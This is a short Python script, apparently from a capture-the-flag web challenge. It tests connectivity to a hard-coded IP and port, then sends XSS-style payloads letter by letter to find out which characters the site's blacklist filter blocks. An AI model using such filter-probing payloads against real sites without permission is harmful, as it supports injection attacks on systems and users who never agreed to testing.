import socket
import time

def test_server_connectivity(host, port, timeout=10):
    """Test if we can connect to the server at all."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception as e:
        return f"Error: {str(e)}"

print("Testing server connectivity...")
print("=" * 50)

host = "94.237.49.241"
port = 4200

print(f"Testing TCP connection to {host}:{port}")
connected = test_server_connectivity(host, port, timeout=15)

if connected is True:
    print(f"[SUCCESS] TCP connection to {host}:{port} successful!")
    print("Server is reachable at the network level.")
    print()
    print("Attempting HTTP requests with extended timeouts...")
    print("=" * 50)
    
    # Now try actual HTTP requests
    import requests
    
    url = f"http://{host}:{port}/page"
    
    # Test basic GET first
    print("\n1. Testing GET request...")
    try:
        response = requests.get(url, timeout=30)
        print(f"GET Response - Status: {response.status_code}")
        print(f"Content length: {len(response.text)}")
        if response.text:
            print(f"Response preview (first 200 chars):\n{response.text[:200]}")
    except Exception as e:
        print(f"GET request failed: {str(e)}")
    
    # Now test POST with different letters
    print("\n2. Testing POST requests with individual letters...")
    print("-" * 50)
    
    letters_to_test = ['p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    
    for i, letter in enumerate(letters_to_test):
        payload = f"name=;{letter}('XSS');//"
        print(f"\nTesting '{letter}' ({i+1}/{len(letters_to_test)})...")
        print(f"Payload: {payload}")
        
        try:
            response = requests.post(url, data=payload, timeout=30)
            
            # Check for blocked message
            blocked_pattern = f"Sorry you can't use: '{letter}'"
            
            if blocked_pattern in response.text:
                print(f"  [BLOCKED] Found pattern: '{blocked_pattern}'")
                # Show the relevant line
                for line in response.text.split('\n'):
                    if blocked_pattern in line:
                        print(f"  Line: {line.strip()}")
            else:
                print(f"  [ALLOWED] No blocked pattern found")
                print(f"  Status: {response.status_code}")
                
        except Exception as e:
            print(f"  [ERROR] {str(e)}")
            continue
        
        # Small delay to avoid overwhelming server
        time.sleep(0.5)
    
else:
    print(f"[FAILED] Cannot connect to {host}:{port}")
    print(f"Result: {connected}")

print()
print("=" * 50)
print("Testing complete.")
